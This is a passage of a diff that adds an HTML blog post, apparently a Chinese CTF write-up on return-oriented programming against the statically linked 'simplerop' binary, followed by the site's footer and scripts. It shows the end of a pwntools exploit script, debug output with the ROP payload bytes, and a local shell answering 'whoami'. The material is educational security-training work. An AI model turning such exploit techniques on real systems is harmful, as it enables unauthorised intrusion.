+<span class="token comment"># gdb.attach(io)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/home/m1nus/elf/buu/simplerop/simplerop'</span> <span class="token assign-left variable">argv</span><span class="token operator">=</span><span class="token punctuation">[</span>b<span class="token string">'/home/m1nus/elf/buu/simplerop/simplerop'</span><span class="token punctuation">]</span> <span class="token builtin class-name">:</span> pid <span class="token number">18643</span>
+exp.py:9: BytesWarning: Text is not bytes<span class="token punctuation">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="token comment">#bytes</span>
+  io.recvuntil<span class="token punctuation">(</span><span class="token string">"Your input :"</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x23 bytes:
+    b<span class="token string">"ROP is easy is'nt it ?<span class="token entity" title="\n">\n</span>"</span>
+    b<span class="token string">'Your input :'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x51 bytes:
+    00000000  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000020  <span class="token number">50</span> <span class="token builtin class-name">cd</span> 06 08  <span class="token number">50</span> e8 06 08  00 00 00 00  <span class="token number">84</span> b5 0e 08  │P···│P···│····│····│
+    00000030  08 00 00 00  06 ae 0b 08  0b 00 00 00  <span class="token number">50</span> e8 06 08  │····│····│····│P···│
+    00000040  00 00 00 00  00 00 00 00  <span class="token number">84</span> b5 0e 08  e1 <span class="token number">93</span> 04 08  │····│····│····│····│
+    00000050  0a                                                  │·│
+    00000051
+exp.py:20: BytesWarning: Text is not bytes<span class="token punctuation">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="token comment">#bytes</span>
+  io.send<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x7 bytes:
+    b<span class="token string">'/bin/sh'</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+$ <span class="token function">whoami</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x7 bytes:
+    b<span class="token string">'whoami\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x6 bytes:
+    b<span class="token string">'m1nus\n'</span>
+m1nus
+$  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>拿到shell</p>
+<p>本文主要是针对比较经典的<code>statically linked</code>程序的ROP方法进行了讲解，如果有其他方法或者问题欢迎大家下方补充</p>
+
+  <p><a class="classtest-link" href="/tags/pwn/" rel="tag">pwn</a> — Oct 1, 2022</p>
+  
+
+
+        </div>
+        <div class="row mt-2">
+  <h3>Search</h3>
+  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
+  <div style="margin-top: 1.5rem;">
+    <ul id="result"></ul>
+  </div>
+</div>
+        <div class="row mt-2">
+  
+    <div class="eight columns">
+      <p id="madewith">Made with ❤ and
+        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
+        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
+        </a>
+        
+        at <a href="https://en.wikipedia.org/wiki/Earth" target="_blank" rel="noreferrer">Earth</a>.</p>
+        
+    </div>
+
+    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
+    <div class="four columns mb-3 posisi" >
+      
+      <a class="ml-0 footer-link icon" href="https://github.com/Mykonos-x" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
+        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+      </a>
+      
+
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://twitter.com/mykonos_x" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
+        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
+      </a>
+      
+
+      
+
+      
+
+    </div>
+  
+</div>
+
+      </div>
+
+    </div>
+
+  </div>
+  <script src="/js/nanobar.min.js"></script>
+
+  <script>
+    var options = {
+      classname: 'nanobar',
+      id: 'myNanobar'
+    };
+    var nanobar = new Nanobar(options);
+    nanobar.go(30);
+    nanobar.go(76);
+    nanobar.go(100);
+  </script>
+
+</body>
+
+</html>
